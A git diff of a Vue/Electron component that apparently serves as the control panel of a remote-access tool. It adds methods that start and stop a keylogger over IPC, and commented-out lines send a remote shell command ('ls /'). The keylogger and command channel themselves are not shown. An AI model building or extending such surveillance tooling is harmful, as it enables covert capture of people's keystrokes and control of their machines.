@@ -19,6 +19,7 @@
 
 <script>
 import FileBrowser from './mainComponents/FileBrowser'
+import { ipcRenderer } from 'electron'
 import { startServer } from '../../../main/Connect/server'
 import request from '../../../main/Connect/request'
 
@@ -39,18 +40,19 @@ export default {
     }
   },
   mounted () {
-    startServer()
+    ipcRenderer.send('startServer')
   },
   methods: {
     handleClickTab (route) {
       this.$store.commit('changeTab', route)
       this.$router.push(route)
-      request.getFilePreview().then((packet) => {
-        console.log(packet)
-      })
-      request.getFilePreview().then((packet) => {
-        console.log(packet)
-      })
+      this.stopKeylogger()
+      // request.getFilePreview().then((packet) => {
+      //   console.log(packet)
+      // })
+      // request.getFilePreview().then((packet) => {
+      //   console.log(packet)
+      // })
       // request.startKeyLogger().then((packet) => {
       //   console.log(packet)
       // })
@@ -60,6 +62,18 @@ export default {
       // request.sendCommand('ls /').then((packet) => {
       //   console.log(packet)
       // })
+    },
+    requestKeylogger () {
+      ipcRenderer.once('updateKeylogger', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestKeylogger', "start")
+    },
+    stopKeylogger () {
+      ipcRenderer.once('keyloggerStop', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestKeylogger', 'stop')
     },
     removeTab (targetName) {
       // 首页不允许被关闭（为了防止el-tabs栏中一个tab都没有）
